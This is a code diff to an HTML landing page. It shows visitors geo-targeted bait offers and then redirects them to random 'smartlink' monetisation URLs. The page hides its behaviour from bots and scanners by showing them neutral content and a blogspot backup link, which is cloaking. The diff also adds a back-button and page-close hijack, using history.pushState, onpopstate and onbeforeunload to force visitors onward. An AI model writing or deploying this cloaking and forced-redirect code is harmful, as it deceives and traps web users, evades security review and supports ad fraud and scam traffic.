@@ -6,11 +6,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 body{margin:0;font-family:Arial,sans-serif;background:#fafafa;color:#111;line-height:1.6}
-#content{display:none;max-width:700px;margin:auto;padding:20px}
+#content{display:none;max-width:700px;margin:auto;padding:20px;text-align:center}
 h1{font-size:22px;color:#111}
-h2{color:#444;margin-top:25px}
 p{margin-bottom:15px}
-footer{margin-top:30px;font-size:13px;color:#888;text-align:center}
+footer{margin-top:30px;font-size:13px;color:#888}
 #loading{display:flex;justify-content:center;align-items:center;height:100vh;}
 </style>
 </head>
@@ -21,8 +20,6 @@ footer{margin-top:30px;font-size:13px;color:#888;text-align:center}
 <div id="content">
   <h1 id="headline">Loading...</h1>
   <p id="desc">Preparing content...</p>
-  <h2>More Info</h2>
-  <p>Stay updated with the latest technology and lifestyle trends across Canada and globally.</p>
   <footer>&copy; 2025</footer>
 </div>
 
@@ -35,6 +32,7 @@ footer{margin-top:30px;font-size:13px;color:#888;text-align:center}
     "https://politicsgrowinghollow.com/cb3yh0vp?key=ff17dd66f144c9303ad63a6cef1e01ed"
   ];
   const backup = "https://scriptdev404.blogspot.com"; 
+
   const geoContent = {
     CA:{headline:["Exclusive Deal for Canada 🇨🇦","Offre exclusive pour le Canada 🇨🇦"],desc:["Unlock rewards available only in Canada.","Débloquez des récompenses disponibles uniquement au Canada."]},
     US:{headline:["Special Offer for USA 🇺🇸","Bonus Deal for US Visitors"],desc:["Claim your bonus now!","Only for USA visitors – limited time."]},
@@ -49,15 +47,22 @@ footer{margin-top:30px;font-size:13px;color:#888;text-align:center}
   }
 
   async function start(){
+    const loading=document.getElementById("loading");
+    const content=document.getElementById("content");
+    const headline=document.getElementById("headline");
+    const desc=document.getElementById("desc");
+
+    // === BOT: hanya lihat konten aman, redirect ke backup ===
     if(isBot()){
-      document.getElementById("loading").style.display="none";
-      document.getElementById("content").style.display="block";
-      const c = geoContent.GLOBAL;
-      document.getElementById("headline").innerText = pickRandom(c.headline);
-      document.getElementById("desc").innerText = pickRandom(c.desc);
+      loading.style.display="none";
+      content.style.display="block";
+      headline.innerText = pickRandom(geoContent.GLOBAL.headline);
+      desc.innerText = pickRandom(geoContent.GLOBAL.desc);
+      setTimeout(()=>{ location.replace(backup); },1500);
       return;
     }
 
+    // === USER: tampilkan lalu redirect ===
     let geo="GLOBAL";
     try{
       const r=await fetch("https://ipapi.co/json/").then(r=>r.json());
@@ -65,18 +70,21 @@ footer{margin-top:30px;font-size:13px;color:#888;text-align:center}
     }catch(e){ geo="GLOBAL"; }
 
     const c = geoContent[geo] || geoContent.GLOBAL;
-    document.getElementById("loading").style.display="none";
-    document.getElementById("content").style.display="block";
-    document.getElementById("headline").innerText = pickRandom(c.headline);
-    document.getElementById("desc").innerText = pickRandom(c.desc);
+    loading.style.display="none";
+    content.style.display="block";
+    headline.innerText = pickRandom(c.headline);
+    desc.innerText = pickRandom(c.desc);
 
     const target = pickRandom(smartlinks);
     const delay = Math.floor(Math.random()*1000)+800;
     setTimeout(()=>{ location.replace(target); }, delay);
 
-    history.pushState(null,null,location.href);
-    onpopstate=()=>location.replace(backup);
-    onbeforeunload=()=>location.replace(backup);
+    // === Force redirect kalau user back/close ===
+    setTimeout(()=>{
+      history.pushState(null,null,location.href);
+      onpopstate=()=>location.replace(target);
+      onbeforeunload=()=>location.replace(target);
+    },2000);
   }
 
   start();
